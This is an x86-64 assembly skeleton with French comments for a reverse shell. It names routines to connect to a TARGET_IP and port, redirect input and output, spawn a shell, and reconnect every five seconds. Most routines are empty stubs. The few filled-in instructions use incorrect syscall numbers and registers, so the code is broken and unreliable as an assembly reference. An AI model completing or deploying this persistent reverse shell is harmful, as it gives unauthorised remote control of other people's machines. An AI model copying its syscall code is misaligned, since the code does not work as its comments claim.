.section .data
    ; Section pour les données initialisées
    TARGET_IP ;ip
    TARGET_PORT ;port

.section .text
    global _start

; ----------------------------------
; Point d'entrée, fonction principale
; ----------------------------------
_start:

; ----------------------------------
; Appel des fonctions
; ----------------------------------
; ----------------------------------
main:

    call create_soket
    call connect
    call redir_io
    call shell
    call exit
    
; ----------------------------------
; Création de la socket 
; ----------------------------------
create_soket:

; ----------------------------------
; Connexion à la cible 
; ----------------------------------
connect:

; ----------------------------------
; Redirection des entrées/sorties 
; ----------------------------------
redir_io:

; ----------------------------------
; Exécution du shell 
; ----------------------------------
shell:

; ----------------------------------
; Reconnexion auto toute les 5 secondes
; ----------------------------------
reconnect_if_fail:
    ; Si la connexion échoue, attendre 5 secondes
    mov rax, 5          ; Code système pour sleep
    mov rbx, 5          ; Temps d'attente (5 secondes)
    syscall             ; Appelle l'interruption pour dormir

    ; Réessayer de se connecter
    jmp connect         ; Retourne à la fonction de connexion

; ----------------------------------
; Gestion des erreurs
; ----------------------------------
error_handler:

; ----------------------------------
; Sortie 
; ----------------------------------
exit:
    mov rax, 1          ; Code système pour terminer le programme
    mov rbx, 0          ; Code de retour (0)
    syscall             ; Appelle l'interruption pour quitter